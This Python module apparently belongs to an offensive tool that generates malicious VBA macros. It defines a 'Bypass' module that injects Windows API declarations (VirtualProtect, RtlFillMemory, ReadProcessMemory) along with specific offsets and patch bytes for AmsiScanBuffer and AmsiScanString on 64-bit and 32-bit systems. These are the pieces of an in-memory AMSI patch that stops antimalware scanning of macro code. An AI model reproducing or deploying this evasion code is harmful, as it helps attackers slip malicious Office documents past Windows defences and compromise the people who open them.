
from lib.interfaces.module_interface import ModuleInterface
from lib.handlers.generic import quotedstring
from lib.tab_completers.generic import tab_choice
from lib.validators.generic import ischoice


class Bypass(ModuleInterface):
    def __init__(self, modulepath, helpers):
        options = {}
        self.helpers = helpers
        self.type = "bypass"
        
        super().__init__(modulepath, options)
        
        

    def preprocess(self):
        self.declares.add('Private Declare PtrSafe Function m_VirtualProtect Lib "kernel32" Alias "VirtualProtect" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Boolean')
        self.declares.add('Private Declare PtrSafe Sub m_RtlFillMemory Lib "kernel32.dll" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)')
        self.declares.add('Private Declare PtrSafe Function m_ReadProcessMemory Lib "kernel32.dll" Alias "ReadProcessMemory" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As LongPtr, ByRef lpNumberOfBytesRead As LongPtr) As Boolean')
        self.declares.add('Private Declare PtrSafe Function m_GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As LongPtr')
        self.declares.add("""
#If Win64 Then
Private Const Offset_e_lfanew As Integer = &H3C
Private Const Offset_OptionalHeader As Integer = &H18
Private Const Offset_DataDirectory As Integer = &H70
Private Const Offset_IMAGE_EXPORT_DIRECTORY_VirtualAddress As Integer = &H0
Private Const Offset_IMAGE_EXPORT_DIRECTORY_Adr_of_Functions As Integer = &H1C
Private Const Offset_fpAmsiScanBuffer As Integer = &HC
Private Const Offset_fpAmsiScanString As Integer = &H10
Private Const AmsiScanString_PatchByte_Offset As Integer = &H7
Private Const AmsiScanString_PatchByte_1 As Byte = &HEB
Private Const AmsiScanString_PatchByte_2 As Byte = &H45
Private Const AmsiScanBuffer_PatchByte_Offset As Integer = &H18
Private Const AmsiScanBuffer_PatchByte_1 As Byte = &HE9
Private Const AmsiScanBuffer_PatchByte_2 As Byte = &HBD
Private Const AmsiScanBuffer_PatchByte_3 As Byte = &H0
Private Const AmsiScanBuffer_PatchByte_4 As Byte = &H0
Private Const AmsiScanBuffer_PatchByte_5 As Byte = &H0
#ElseIf Win32 Then
Private Const Offset_e_lfanew As Integer = &H3C
Private Const Offset_OptionalHeader As Integer = &H18
Private Const Offset_DataDirectory As Integer = &H60
Private Const Offset_IMAGE_EXPORT_DIRECTORY_VirtualAddress As Integer = &H0
Private Const Offset_IMAGE_EXPORT_DIRECTORY_Adr_of_Functions As Integer = &H1C
Private Const Offset_fpAmsiScanBuffer As Integer = &HC
Private Const Offset_fpAmsiScanString As Integer = &H10
Private Const AmsiScanString_PatchByte_Offset As Integer = &H5
Private Const AmsiScanString_PatchByte_1 As Byte = &HEB
Private Const AmsiScanString_PatchByte_2 As Byte = &H3E
Private Const AmsiScanBuffer_PatchByte_Offset As Integer = &HA
Private Const AmsiScanBuffer_PatchByte_1 As Byte = &HE9
Private Const AmsiScanBuffer_PatchByte_2 As Byte = &H8F
Private Const AmsiScanBuffer_PatchByte_3 As Byte = &H0
Private Const AmsiScanBuffer_PatchByte_4 As Byte = &H0
Private Const AmsiScanBuffer_PatchByte_5 As Byte = &H0
#End If
""")



